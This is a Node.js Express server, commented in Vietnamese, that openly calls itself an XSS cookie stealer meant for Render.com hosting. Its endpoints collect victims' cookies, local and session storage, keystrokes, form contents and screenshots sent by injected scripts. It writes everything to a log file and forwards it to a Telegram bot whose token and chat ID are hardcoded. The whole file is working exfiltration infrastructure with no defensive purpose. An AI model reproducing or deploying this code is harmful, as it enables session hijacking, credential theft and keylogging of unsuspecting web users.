/**
 * ============================================
 *  🚀 XSS COOKIE STEALER SERVER
 *  Dành cho Render.com
 * ============================================
 */

const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// ====== CẤU HÌNH TELEGRAM ======
const BOT_TOKEN = process.env.BOT_TOKEN || "8921957218:AAFpPTSp5c56ByZMXZRlw8XwBxXj9ap_AE8";
const CHAT_ID = process.env.CHAT_ID || "8872446985";

// ====== MIDDLEWARE ======
app.use(cors({
    origin: '*',
    credentials: true
}));
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static('public')); // Serve file tĩnh từ thư mục public

// ====== LOG FILE ======
const LOG_FILE = path.join(__dirname, 'cookies.log');

// ====== GỬI VỀ TELEGRAM ======
async function sendToTelegram(message) {
    if (!BOT_TOKEN || BOT_TOKEN === 'YOUR_BOT_TOKEN') {
        console.log('⚠️ Chưa cấu hình BOT_TOKEN');
        console.log('📩 Tin nhắn sẽ gửi:', message);
        return;
    }

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
                disable_web_page_preview: true
            })
        });
        
        const data = await response.json();
        if (data.ok) {
            console.log('✅ Đã gửi về Telegram');
        } else {
            console.error('❌ Lỗi Telegram:', data);
        }
    } catch (error) {
        console.error('❌ Lỗi gửi:', error.message);
    }
}

// ====== LOG TO FILE ======
function logToFile(data) {
    try {
        const log = `[${new Date().toISOString()}] ${JSON.stringify(data)}\n`;
        fs.appendFileSync(LOG_FILE, log);
    } catch (_) {}
}

// ====== ENDPOINT NHẬN COOKIE ======
app.post('/steal', async (req, res) => {
    const cookies = req.headers.cookie || 'Không có cookie';
    const data = req.body || {};
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';

    console.log(`📩 Nhận cookie từ ${ip}`);

    // Xây dựng tin nhắn
    let message = '🍪 **XSS COOKIE STEALER**\n\n';
    message += `📌 **URL:** ${data.url || 'Không xác định'}\n`;
    message += `🌐 **Domain:** ${data.domain || 'Không xác định'}\n`;
    message += `🖥️ **User-Agent:** ${data.userAgent || 'Không có'}\n`;
    message += `📱 **Screen:** ${data.screen || 'Không có'}\n`;
    message += `🔌 **IP:** ${ip}\n`;
    message += `🕒 **Time:** ${new Date().toLocaleString('vi-VN')}\n\n`;

    // Cookie từ header
    if (cookies !== 'Không có cookie') {
        message += `🍪 **Cookie (Header):**\n\`\`\`\n${cookies}\n\`\`\`\n\n`;
    }

    // Cookie từ body
    if (data.cookies && data.cookies !== '' && data.cookies !== '(Không có cookie)') {
        message += `🍪 **Cookie (JS):**\n\`\`\`\n${data.cookies}\n\`\`\`\n\n`;
    }

    // LocalStorage
    if (data.localStorage && Object.keys(data.localStorage).length > 0) {
        let lsData = {};
        try {
            lsData = typeof data.localStorage === 'object' ? data.localStorage : JSON.parse(data.localStorage);
        } catch (_) {
            lsData = { raw: data.localStorage };
        }
        message += `💾 **LocalStorage:**\n\`\`\`json\n${JSON.stringify(lsData, null, 2)}\n\`\`\`\n\n`;
    }

    // SessionStorage
    if (data.sessionStorage && Object.keys(data.sessionStorage).length > 0) {
        let ssData = {};
        try {
            ssData = typeof data.sessionStorage === 'object' ? data.sessionStorage : JSON.parse(data.sessionStorage);
        } catch (_) {
            ssData = { raw: data.sessionStorage };
        }
        message += `📦 **SessionStorage:**\n\`\`\`json\n${JSON.stringify(ssData, null, 2)}\n\`\`\`\n\n`;
    }

    // Keylog
    if (data.keys) {
        message += `⌨️ **Keylog:**\n\`${data.keys}\`\n\n`;
    }

    // Form data
    if (data.form) {
        message += `🔐 **Form Data:**\n\`\`\`json\n${JSON.stringify(data.form, null, 2)}\n\`\`\`\n\n`;
    }

    // Ghi log
    logToFile({ ip, cookies, data });

    // Gửi về Telegram
    await sendToTelegram(message);

    res.status(200).json({ 
        status: 'ok', 
        message: 'Cookie received',
        timestamp: new Date().toISOString()
    });
});

// ====== ENDPOINT NHẬN QUA GET (CHO IMG TAG) ======
app.get('/steal', async (req, res) => {
    const cookies = req.headers.cookie || 'Không có cookie';
    const query = req.query;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';

    let message = '🍪 **XSS COOKIE STEALER (GET)**\n\n';
    message += `🔌 **IP:** ${ip}\n`;
    message += `🍪 **Cookie:** \`${cookies}\`\n`;
    if (query.data) {
        message += `📦 **Data:** \`${query.data}\`\n`;
    }

    logToFile({ ip, cookies, query });
    await sendToTelegram(message);

    res.send('OK');
});

// ====== ENDPOINT NHẬN KEYLOG ======
app.post('/keylog', async (req, res) => {
    const data = req.body || {};
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';

    const message = `⌨️ **KEYLOG**\n\n📌 URL: ${data.url || 'Unknown'}\n🔌 IP: ${ip}\n\n\`${data.keys || 'Không có dữ liệu'}\``;

    logToFile({ type: 'keylog', ip, data });
    await sendToTelegram(message);

    res.json({ status: 'ok' });
});

// ====== ENDPOINT NHẬN SCREENSHOT ======
app.post('/screenshot', express.raw({ type: 'application/octet-stream', limit: '10mb' }), async (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
    
    try {
        // Lưu ảnh tạm
        const filename = `screenshot_${Date.now()}.png`;
        const filepath = path.join(__dirname, filename);
        fs.writeFileSync(filepath, req.body);

        // Gửi ảnh qua Telegram
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
        const formData = new FormData();
        const blob = new Blob([req.body], { type: 'image/png' });
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, filename);
        formData.append('caption', `📸 **Screenshot**\n🔌 IP: ${ip}`);

        await fetch(url, {
            method: 'POST',
            body: formData
        });

        // Xóa file tạm
        fs.unlinkSync(filepath);

        res.json({ status: 'ok' });
    } catch (error) {
        console.error('Lỗi screenshot:', error);
        res.status(500).json({ error: error.message });
    }
});

// ====== TEST ENDPOINT ======
app.get('/test', (req, res) => {
    res.send(`
        <h1>🚀 XSS Cookie Stealer Server</h1>
        <p>✅ Server đang chạy!</p>
        <p>📩 POST <code>/steal</code> - Nhận cookie</p>
        <p>📩 GET <code>/steal</code> - Nhận cookie (GET)</p>
        <p>📩 POST <code>/keylog</code> - Nhận keylog</p>
        <p>📸 POST <code>/screenshot</code> - Nhận screenshot</p>
        <p>📋 GET <code>/logs</code> - Xem logs</p>
        <p>🕒 Time: ${new Date().toLocaleString('vi-VN')}</p>
        <hr>
        <p>🍪 <a href="/">Trang chính</a></p>
    `);
});

// ====== VIEW LOGS ======
app.get('/logs', (req, res) => {
    if (!fs.existsSync(LOG_FILE)) {
        return res.send('Chưa có log nào');
    }
    const logs = fs.readFileSync(LOG_FILE, 'utf8');
    res.send(`<pre>${logs}</pre>`);
});

// ====== ROOT ======
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ====== START ======
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server đang chạy trên port ${PORT}`);
    console.log(`📩 POST /steal - Nhận cookie`);
    console.log(`📩 GET /steal - Nhận cookie (GET)`);
    console.log(`📩 POST /keylog - Nhận keylog`);
    console.log(`📸 POST /screenshot - Nhận screenshot`);
    console.log(`🧪 Test: /test`);
    console.log(`📋 Logs: /logs`);
});
